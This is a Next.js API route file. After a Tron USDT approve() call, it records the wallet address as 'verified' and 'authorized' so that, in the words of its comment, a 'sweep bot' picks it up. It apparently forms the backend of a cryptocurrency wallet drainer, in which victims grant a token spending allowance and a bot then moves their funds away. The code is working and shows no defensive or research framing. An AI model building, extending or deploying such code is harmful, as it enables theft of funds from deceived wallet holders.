import { NextRequest, NextResponse } from "next/server";
import { supabaseAdmin } from "@/lib/supabase";

export const runtime = "nodejs";

// Called by the frontend after a Tron USDT approve() has been broadcast.
// Writes the wallet to verified_wallets (chain=tron) so the Tron sweep bot
// picks it up on its next poll or Realtime event.
export async function POST(req: NextRequest) {
  try {
    const body = await req.json().catch(() => null);
    const { address } = body ?? {};

    // Basic Tron address validation (base58, starts with T, 34 chars)
    if (!address || typeof address !== "string" || !/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address)) {
      return NextResponse.json({ ok: false, error: "invalid_tron_address" }, { status: 400 });
    }

    const db = supabaseAdmin();
    const { error } = await db.from("verified_wallets").upsert(
      {
        address,
        chain: "tron",
        authorized: true,
        authorize_tx: null,
        approved_tokens: [{ symbol: "USDT", address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" }],
        needs_reactivation: false,
        updated_at: new Date().toISOString(),
      },
      { onConflict: "address,chain" }
    );

    if (error) {
      console.error("[verify/tron] upsert failed:", error);
      return NextResponse.json({ ok: false, error: "persist_failed" }, { status: 500 });
    }

    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error("[verify/tron] unexpected error:", err);
    return NextResponse.json({ ok: false, error: "internal_error" }, { status: 500 });
  }
}
